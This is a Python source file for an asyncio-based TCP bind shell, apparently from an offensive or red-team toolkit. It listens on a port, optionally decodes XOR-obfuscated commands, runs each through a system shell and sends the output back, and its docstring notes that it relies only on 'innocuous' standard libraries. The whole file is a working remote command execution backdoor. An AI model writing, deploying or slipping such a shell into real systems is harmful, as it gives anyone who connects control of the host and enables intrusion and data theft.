import asyncio
from utils.xor_encoder import Xor



class AsyncioBindShell:
    """
    A TCP bind shell that only requires importing the `asyncio` library unless xor
    encryption is enabled which is wrapped in base64 encoding, so the base64 library is
    required in that case. Both libraries come standard with the python interpreter and
    are rather innocuous.
    """
    def __init__(self, host: str, port: int, key: str = None, verbose: bool = False):
        self.host = host
        self.port = port
        self.xor = Xor(key)
        self.verbose = verbose
        self.server_task = None

    def printer(self, text):
        if self.verbose:
            print(text)


    async def echo_server(self, reader, writer):
        writer.write(self.xor.encoder('#HELLO\n'))
        while True:
            data = await reader.read(1024)  # Max number of bytes to read
            if not data:
                break
            data = self.xor.decoder(data)
            if data.strip('\r\n').upper() == "__QUIT__":
                self.printer('[quit] received quit')
                writer.write(self.xor.encoder('__EOF__\n'))
                await writer.drain()
                writer.close()
                await writer.wait_closed()
                self.server_task.cancel()
                return
            ret = await self.exec_cmd(data)
            ret = self.xor.encoder(ret)
            writer.write(ret)
            await writer.drain()  # Flow control, see later
        writer.close()

    async def exec_cmd(self, cmd):
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT
        )

        stdout, stderr = await proc.communicate()
        return stdout.decode()


    async def main(self):
        server = await asyncio.start_server(self.echo_server, self.host, self.port)
        async with server:
            self.server_task = asyncio.create_task(server.serve_forever())
            try:
                await self.server_task
            except asyncio.CancelledError:
                exit()


if __name__ == '__main__':
    # Change the key to some string to enable xor encryption.
    shell = AsyncioBindShell('127.0.0.1', 1337, None, False)
    asyncio.run(shell.main())